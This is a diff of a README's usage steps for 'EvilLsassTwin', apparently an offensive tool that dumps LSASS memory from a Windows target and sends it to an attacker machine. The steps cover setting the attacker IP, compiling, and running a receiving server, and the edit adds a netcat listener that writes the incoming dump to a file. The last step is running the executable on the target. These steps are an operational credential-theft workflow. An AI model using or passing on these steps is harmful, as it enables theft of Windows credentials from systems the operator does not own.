@@ -22,7 +22,7 @@ This project was developed and tested with Nim 1.6.14. It has not yet been teste
 1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
 2. Edit line 291 in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number as well.
 3. Compile the project with `nim build`.
-4. `chmod +x EvilLsassTwinServer && ./EvilLsassTwinServer`
+4. `chmod +x EvilLsassTwinServer && ./EvilLsassTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
 5. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
 
 # Resources
